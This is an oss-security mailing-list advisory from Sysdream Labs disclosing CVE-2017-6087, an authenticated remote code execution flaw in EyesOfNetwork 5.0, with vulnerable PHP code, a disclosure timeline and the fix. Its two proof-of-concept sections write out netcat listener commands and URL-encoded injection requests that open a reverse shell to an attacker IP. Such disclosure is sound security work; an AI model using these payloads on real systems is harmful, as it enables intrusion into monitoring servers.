X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4863" "Thursday" "23" "March" "2017" "16:21:31" "+0100" "Sydream Labs" "labs@sysdream.com" "<2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>" "182" "[oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution" nil nil nil "3" "2017032315:21:31" "[oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution" (number mark "U       labs@sysdrea Mar 23  182/4863  " thread-indent "\"[oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20278 invoked by uid 550); 23 Mar 2017 15:21:46 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20200 invoked from network); 23 Mar 2017 15:21:45 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 29A521A0D4A
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1490282493;
	bh=9243A5QWWgw9NHL69L2wKviLK6zeM8gnJgZlsFBKroE=;
	h=From:Subject:To:Message-ID:Date:MIME-Version:Content-Type;
	b=GkwOC+1zI0hbxVC3xybgPpRpR6o5VgIQrfNPPa61flAAB9l/wiiZcb/edyMZ6n9Fc
	 xPNBkE9ItbyVeg7JEVIgnjVOf81TgCdTjoEn3dS0HZgWUWG+bPQ1eRuqVIOgEfT0vn
	 QUBlpH7+d62Jn0tCufr8IUY47LCNAouncl1X5i0w=
From: Sydream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Message-ID: <2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>
Date: Thu, 23 Mar 2017 16:21:31 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="mWFejrWsg1eve5VvOimx1ht1lglXQa6im"
Subject: [oss-security] [CVE-2017-6087] EON 5.0 Remote Code Execution

--mWFejrWsg1eve5VvOimx1ht1lglXQa6im
Content-Type: multipart/mixed; boundary="6pRXxWHNWqKdEmorkSJ2k3Ix2XqJoTGjh";
 protected-headers="v1"
From: Sydream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Message-ID: <2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>
Subject: [CVE-2017-6087] EON 5.0 Remote Code Execution

--6pRXxWHNWqKdEmorkSJ2k3Ix2XqJoTGjh
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-6087] EON 5.0 Remote Code Execution

## Description

EyesOfNetwork ("EON") is an OpenSource network monitoring solution.

## Remote Code Execution (authenticated)

The Eonweb code does not correctly filter arguments, allowing
authenticated users to execute arbitrary code.

**CVE ID**: CVE-2017-6087

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-78

**CVSS Base Score**: 7.6

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L


### Proof of Concept 1

On the attacker's host, we start a handler:

```
nc -lvp 1337
```

The `selected_events` parameter is not correctly filtered before it is
used by the `shell_exec()` function.

There, it is possible to inject a payload like in the request below,
where we connect back to our handler:

```
https://eonweb.local/module/monitoring_ged/ged_actions.php?queue=3Dhistory&=
action=3Dconfirm&global_action=3D4&selected_events%5B%5D=3D;nc%2010.0.5.124=
%201337%20-e%20/bin/bash;
```

#### Vulnerable code

The payload gets injected into the `$event[$key]` and `$ged_command`
variables of the `module/monitoring_ged/ged_functions.php` file, line 373:

```
$ged_command =3D "-update -type $ged_type_nbr ";
foreach ($array_ged_packets as $key =3D> $value) {
  if($value["type"] =3D=3D true){
    if($key =3D=3D "owner"){
      $event[$key] =3D $owner;
    }
    $ged_command .=3D "\"".$event[$key]."\" ";
  }
}
$ged_command =3D trim($ged_command, " ");
shell_exec($path_ged_bin." ".$ged_command);
```

Two other functions in this file are also affected by this problem:

* `delete($selected_events, $queue);`
* `ownDisown($selected_events, $queue, $global_action);`


### Proof of Concept 2

On the attacker's host, we start a handler:

```
nc -lvp 1337
```

The `module` parameter is not correctly filtered before it is used by
the `shell_exec()` function.

Again, we inject our connecting back payload:

```
https://eonweb.local/module/index.php?module=3D|nc%20192.168.1.14%201337%20=
-e%20/bin/bash&link=3Dpadding
```

#### Vulnerable code

In the `module/index.php` file, line 24, we can see that our payload is
injected into the `exec()` function without any sanitization:

```
# Check optionnal module to load
if(isset($_GET["module"]) && isset($_GET["link"])) {

	$module=3Dexec("rpm -q ".$_GET["module"]." |grep '.eon' |wc -l");

	# Redirect to module page if rpm installed
	if($module!=3D0) { header('Location: '.$_GET["link"].''); }

}
```


## Timeline (dd/mm/yyyy)

* 01/10/2016 : Initial discovery.
* 09/10/2016 : Fisrt contact with vendor.
* 23/10/2016 : Technical details sent to the security contact.
* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
* 11/10/2016 : Testing the patch revealed that it needed more work.
* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
repsonsible disclosure agreement.
* 14/03/2017 : Public disclosure.

Thank you to EON for the fast response.

## Solution

Update to version 5.1

## Affected versions

* Version <=3D 5.0

## Credits

* Nicolas SERRA <n.serra@sysdream.com>

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream




--6pRXxWHNWqKdEmorkSJ2k3Ix2XqJoTGjh--

--mWFejrWsg1eve5VvOimx1ht1lglXQa6im
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIvBAEBCAAZBQJY0+f8EhxsYWJzQHN5c2RyZWFtLmNvbQAKCRCOtIzZ1bJZoe5p
EAC6fYCptLg87hRfURRt8kuZMbBydkKkmB5Xe2qcvx66qIfnGUlP085nFMDm+NYp
cGN3M/HXVue9IM7BEtw9ioij7q+gLUWQizMdePGhcxcRUb9Oj6jbnfAmU9ICWp+K
l5dBFaNMVV5Oi7QmpSTZKYTV49FVmz9CWpZE70Y6j9j65TZXZH3IlVe7sOLVGm1Y
YbNpR4hZaDy6XXZIpl8YWuGzXAbSi+4AvhYao7lTGH2Sb2cFNF5mrhOS6y7h6myo
yoVKQXFpx7mK8ognYOIW1EJPJ+hAPImRtWIIUETIufF8aN8gSXgBhxnnVKODQeeL
XdmWiLGvpyHfRIFDUchGFpC5FdWFFO3vjMlSbBO3/4wVkh9MGHP0mCdOAyvFVIwn
h3wRGXFSKqGEUb9vCGy/En8L70/s08iLN6Cc0w15E3E0M0iR17zd8PV3iiJeUi2m
164TBjjyDrNTUU7Q9WYRLkctM2KzQDjsdklu140I3qxPuslQTCv5Z7P+yf3Ok6oo
kYrma74yTTUSis61mNh1g5FA0AUQ/YNOq78yLXybrnSpL1lZOurAWESbMxTnPUSf
YR2CKfsUDpm3tp/glyXtHjNtsOY1wsn9+OjvT5qN3BEx1mquffyLvhM7wQC3AzEN
1t0xAaguKVtd1jrJlOO2yHfct1IGDvrCpHWb1ym844dJyQ==
=qKHs
-----END PGP SIGNATURE-----

--mWFejrWsg1eve5VvOimx1ht1lglXQa6im--
